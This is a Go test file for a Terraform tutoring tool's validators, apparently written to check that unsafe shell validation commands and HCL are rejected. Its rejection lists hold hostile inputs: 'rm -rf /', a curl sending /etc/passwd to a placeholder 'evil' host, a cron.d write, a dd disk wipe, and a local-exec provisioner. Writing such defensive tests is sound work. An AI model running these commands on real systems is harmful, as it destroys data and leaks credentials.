package tutor

import "testing"

func TestSafeValidation(t *testing.T) {
	ok := []string{
		`terraform -chdir="$TFDIR" state list 2>/dev/null | grep -q local_file.x && echo OK || echo FAIL`,
		`test -f "$TFDIR/hello.txt" && echo OK || echo FAIL`,
		`[ "$(terraform -chdir="$TFDIR" output -raw saud 2>/dev/null)" != "" ] && echo OK || echo FAIL`,
	}
	for _, v := range ok {
		if !safeValidation(v) {
			t.Errorf("validação legítima rejeitada: %q", v)
		}
	}
	bad := []string{
		`terraform -chdir="$TFDIR" state list; rm -rf /`,
		`curl http://evil/$(cat /etc/passwd)`,
		`echo OK > /etc/cron.d/x`,
		`terraform apply && dd if=/dev/zero of=/dev/sda`,
		`echo hi`, // não opera sobre terraform/$TFDIR
	}
	for _, v := range bad {
		if safeValidation(v) {
			t.Errorf("validação perigosa/irrelevante aceita: %q", v)
		}
	}
}

func TestSafeHCL(t *testing.T) {
	if !safeHCL(`terraform { required_providers { local = { source = "hashicorp/local" } } }
resource "local_file" "h" { filename = "h.txt" content = "oi" }`) {
		t.Error("HCL válido (provider local) rejeitado")
	}
	bad := []string{
		`resource "aws_instance" "x" {}`,
		`resource "null_resource" "x" { provisioner "local-exec" { command = "rm -rf /" } }`,
		`resource "local_file" "x" { filename = "/etc/passwd" content = "" }`,
		`terraform { required_providers { ext = { source = "hashicorp/external" } } }`,
	}
	for _, h := range bad {
		if safeHCL(h) {
			t.Errorf("HCL perigoso aceito: %q", h)
		}
	}
}
